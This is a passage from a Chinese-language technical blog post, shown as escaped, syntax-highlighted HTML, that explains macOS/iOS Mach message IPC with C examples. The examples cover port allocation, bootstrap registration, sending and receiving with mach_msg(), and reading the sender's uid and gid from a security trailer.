	&lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_base_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_bits_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;msgh_voucher_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_id_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_body_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上来自《深入解析Mac OS X &amp;amp; iOS操作系统》第十章&lt;/p&gt;

&lt;p&gt;有了一些基本概念之后，我们尝试从开发角度来使用Mach Message&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;创建Receiver Port并等待接收消息&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;首先我们要创建分配一个Port&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mach_port_allocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_RIGHT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取往Port发消息的Right&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_insert_right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;向系统注册该Port，这样其它进程都可以通过对应的名字搜索到该Port&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bootstrap_register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bootstrap_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;com.wnagzihxa1n.port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;阻塞线程等待接收消息&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 另一种写法 (mach_msg_header_t *) &amp;amp;message.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// 两种选项：发送和接收，此处是接收&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// 发送消息的长度&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 等待接收消息的长度&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// 要获取消息的port&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意trailer在此处的使用，trailer可以附加在消息尾部作为额外的请求，trailer不计算入消息头的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_size&lt;/code&gt;，它有自己的长度字段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msgh_trailer_size&lt;/code&gt;，此处使用的是最小的空trailer&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_type_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;获取Sender Port并向其发送消息&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;搜索并获取指定Port&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bootstrap_look_up&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bootstrap_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;com.wnagzihxa1n.port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;构造消息&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_COPY_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_local_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;some_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;some_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;some_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此处是发送消息，注意第二个参数&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 另一种写法 (mach_msg_header_t *) &amp;amp;message.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 两种选项：发送和接收，此处是发送&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 发送消息的长度&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// 等待接收消息的长度&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// 要获取消息的port&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;到此完成Mach Message的接收与发送流程&lt;/p&gt;

&lt;p&gt;如果有兴趣可以详读这两篇文章，第一篇的代码没有问题，但是第二篇的代码有点过时了，我没有运行起来&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html&lt;/li&gt;
  &lt;li&gt;https://flylib.com/books/en/3.126.1.107/1/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们来看如何在这个过程中发挥trailer的作用，将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trailer_t&lt;/code&gt;改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_security_trailer_t&lt;/code&gt;，同时修改函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_masg()&lt;/code&gt;第二个参数&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mach_msg_security_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 另一种写法 (mach_msg_header_t *) &amp;amp;message.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_ELEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_RCV_TRAILER_SENDER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;-- 添加trailer请求位&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// 发送消息的长度&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 等待接收消息的长度&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// 要获取消息的port&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_MSG_TIMEOUT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当收到消息，即可打印出发送消息者的信息&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sender's user id is %u&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Sender's user group is %u&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Sender's user id is 501&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Sender's user group is 20&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ➜  id&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// uid=501(wnagzihxa1n) gid=20(staff) groups=20(staff)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从这个过程可以看出来，Port接收者可以在调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;时额外从内核指定获取一些数据&lt;/p&gt;

&lt;p&gt;以上代码来自《Mac OS X技术内幕》第九章&lt;/p&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;第二个参数有如下的标志位，这个参数在内核里用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;option&lt;/code&gt;来表示&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* The options that the kernel honors when passed from user space */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define MACH_SEND_USER (
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;MACH_SEND_TIMEOUT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_NOTIFY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_OVERRIDE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_TRAILER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_NOIMPORTANCE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_SYNC_OVERRIDE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_PROPAGATE_QOS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_SEND_SYNC_BOOTSTRAP_CHECKIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_MSG_STRICT_REPLY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;MACH_RCV_GUARDED_DESC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define MACH_RCV_USER (
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
